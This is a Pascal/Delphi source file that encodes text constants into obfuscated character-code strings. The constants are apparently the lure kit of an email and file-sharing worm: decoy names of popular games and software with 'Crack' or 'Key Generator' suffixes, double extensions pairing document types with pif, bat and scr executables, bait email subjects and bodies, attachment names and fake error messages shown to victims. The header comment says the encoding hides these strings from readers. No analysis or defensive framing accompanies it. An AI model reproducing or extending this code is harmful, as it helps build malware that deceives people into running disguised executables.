// This program encode the constants and write them into txt files.
// You can put the encoded strings into your project, after the txt files
// are created. It is an easy encription, but lamers can not read the stings
// in the file.

PROGRAM EncodeString;

CONST
  CRLF = #10#13;

  TFakeFiles : pChar =
                   'CKY3 - Bam Margera World Industries Alien Workshop,'+
                   'Cat Attacks Child,'+
                   'Windows XP,'+
                   'AIM Account Stealer,'+
                   'MSN Password Hacker and Stealer,'+
                   'Hacking Tool Collection,'+
                   'Macromedia Flash 5.0,'+
                   'DSL Modem Uncapper,'+
                   'Internet and Computer Speed Booster,'+
                   'ZoneAlarm Firewall,'+
                   'Borland Delphi 6,'+
                   'BORLAND Delphi 7,'+
                   'Shakira,'+
                   'Gladiator,'+
                   'AikaQuest3Hentai,'+
                   'MoviezChannelsInstaler,'+
                   'Zidane-ScreenInstaler,'+
                   'LordOfTheRingsr,'+
                   'SIMS,'+
                   'Quake 4 BETA,'+
                   'Xbox.info,'+
                   'GTA3,'+
                   'Battle.net,'+
                   'Warcraft 3 battle.net,'+
                   'Half-life WON,'+
                   'Winzip 8.0,'+
                   'Winrar 3.2,'+
                   'Warcraft 3 ONLINE,'+
                   'Half-life ONLINE,'+
                   'Grand Theft Auto 3,'+
                   'Macromedia,'+
                   'KaZaA Media Desktop v2.5 UNOFFICIAL,'+
                   'KaZaA Spyware Remover,'+
                   'Age Of Empires 2,'+
                   'Norton AntiVirus 2002,'+
                   'Macromedia Dreamweaver MX,'+
                   'Microsoft Office XP (English),'+
                   'CloneCD,'+
                   'Windows XP SP1,'+
                   'The Neverending Story Part I,'+
                   'Free Virus Removal Tool From Symantec,'+
                   'The Sun Of All Fears,'+
                   'Crazy Taxi,'+
                   'Duke Nukem Manhattan Project,'+
                   'Industry Giant 2,'+
                   'F1 Grand Pix 4,'+
                   'Star Wars II Movie,'+
                   'Nero Burning Rom 5.8.0.1,'+
                   'Need For Speed 5 Porsche Unleashed,'+
                   'Half Life Blue Shift,'+
                   'Quake 3 Arena,'+
                   'Warcraft 3,'+
                   'Civilization 3,'+
                   'Black And White,'+
                   'Strike Fighter Project 1,'+
                   'Mafia,'+
                   'The Eye Of Kraken,'+
                   'Hoyle Card Games 2003,'+
                   'GTA 3,'+
                   'Hard Truck 18 Wheels of Steel,'+
                   'Comanche 4,'+
                   'Grand Prix 4,'+
                   'Age of Sail 2,'+
                   'Sudden Strike 2,'+
                   'Neverwinter Nights,'+
                   'Soldier Of Fortune 2,'+
                   'Valhalla Chronicles,'+
                   'International Cricket Captain 2003,'+
                   'Critical Point Manga game,'+
                   'Elder Scrolls III Morrowind THX Brrbrr,'+
                   'Unreal Tournament 3,'+
                   'Aliens versus Predator 2 Primal Hunt,'+
                   'Star Wars Starfighter,'+
                   'Norton Utilities 2002 XP,'+
                   'Hitman 2 Silent Assassin,'+
                   'MS Train Simulator,'+
                   'Cabelas Ultimate Deer Hunt 2,'+
                   'Dweebs 2,'+
                   'Age Of Wonders 2,'+
                   'Austerlitz Napoleons Greatest Victory,'+
                   'Emperor Rise Of the Middle Kingdom,'+
                   'Necromania Trap Of Darkness,'+
                   'Prisoner Of War,'+
                   'Squad Battles Eagles Strike,'+
                   'Stronghold Crusader,'+
                   'Tomb Raider 3,'+
                   'Deadly Dozen,'+
                   'Empire Earth,'+
                   'Freedom Force,'+
                   'Gearhead Garage,'+
                   'Red Ace Squadron,'+
                   'Clive Barker’s Undying,'+
                   'The Thing,'+
                   'Dark Age Of Camelot Shrouded Isles,'+
                   'Combat Flight Simulator 3,'+
                   'Soldiers Of Anarchy,'+
                   'FIFA 2003';

  TAddon : pChar = 'Crack,Patch,Key Generator,Full Downloader,ISO - Full Downloader,Downloader';

  TExtensions1 : pChar = 'doc,mp3,xls,wav,txt,jpg,gif,dat,bmp,htm,mpg,mdb,zip';

  TExtensions2 : pChar = 'pif,bat,scr';

  TBodys : pChar =
    'Check the attachment!,See the attachement!,Enjoy the attachement!,'+
    'More details attached!,Hi'+CRLF+CRLF+'Check the Attachement ..'+CRLF+CRLF+'See u,'+
    'Hi'+CRLF+CRLF+'Check the Attachement ..,Attached one Gift for u..,WOW CHECK THIS!';

  TErrorMessages : pChar =
    'This File is Corrupted!,This Software need more virtual memory!,'+
    'Error: Low System Performance!,Error: Can Not Find Config.INI!,'+
    'This software need MSIO32.DLL!,Application attempted to read memory at 0xFFFFFFFFh!,'+
    'The system cannot find the file specified.,Stack overflow.,'+
    'Cannot allocate memory.,A fatal exception 06 has occurred at <A900>:<A0973BFD>.,'+
    'Fatal Exception 0E has occurred at memory address in module Vxd IOS(04) + memory address.,'+
    'A fatal exception 0E has occurred at 0028:C02A0201 in VXD IOS(04)+00001FC9';

  TAttachments : pChar =
    'screensaver,screensaver4u,screensaver4u,screensaverforu,freescreensaver,'+
    'love,lovers,lovescr,loverscreensaver,loversgang,loveshore,love4u,lovers,'+
    'enjoylove,sharelove,shareit,checkfriends,urfriend,friendscircle,friendship,'+
    'friends,friendscr,friends,friends4u,friendship4u,friendshipbird,friendshipforu,'+
    'friendsworld,werfriends,passion,bullshitscr,shakeit,shakescr,shakinglove,'+
    'shakingfriendship,passionup,rishtha,greetings,lovegreetings,friendsgreetings,'+
    'friendsearch,lovefinder,truefriends,truelovers,fucker';

  TSubjects : pChar =
    'Greets!!,Get 8 FREE issues - no risk!!,Hi!,Your News Alert!!,'+
    '$150 FREE Bonus!!,Your Gift!,New bonus in your cash account!,'+
    'Tools For Your Online Business!,Daily Email Reminder!,News,'+
    'Free Shipping!,Its Easy!,Warning!,SCAM alert!!!,Sponsors needed!,'+
    'New Reading,CALL FOR INFORMATION!,25 merchants and rising!,Cows,'+
    'My eBay ads!,Empty account!,Market Update Report!,Click on this!,'+
    'Fantastic!,Wow!,Bad news!!,Lost & Found!,New Contests!,Today Only!!,'+
    'Get a FREE gift!,Membership Confirmation,Report,Please Help...,'+
    'Stats,I need help about script!!!,Interesting...,Introduction,'+
    'Various!,Announcement!,History screen!,Correction of errors!,'+
    'Just a reminder!,Payment notices!';

PROCEDURE Encode(ISTR:pChar;FileName:STRING);
VAR
  F : TextFile;
  I : WORD;
  S : STRING;
  O : BYTE;
  T : BYTE;
BEGIN
  AssignFile(F,FileName);
  ReWrite(F);
  O:=0;
  FOR I:=0 TO Length(ISTR)-1 DO BEGIN
    Inc(O);
    T:=Ord(ISTR[I])+100;
    Str(T,S);
    IF Length(S)=1 THEN S:='00'+S;
    IF Length(S)=2 THEN S:='0'+S;
    S:='#'+S+'+';
    IF O=12 THEN BEGIN
      O:=0;
      S:=S+CRLF+'                    ';
    END;
    Write(F,S);
  END;
  CloseFile(F);
END;

BEGIN
  Encode(TFakeFiles,'FakeFiles.txt');
  Encode(TAddon,'Addon.txt');
  Encode(TExtensions1,'Extensions1.txt');
  Encode(TExtensions2,'Extensions2.txt');
  Encode(TErrorMessages,'ErrorMessages.txt');
  Encode(TBodys,'Bodys.txt');
  Encode(TAttachments,'Attachments.txt');
  Encode(TSubjects,'Subjects.txt');
END.

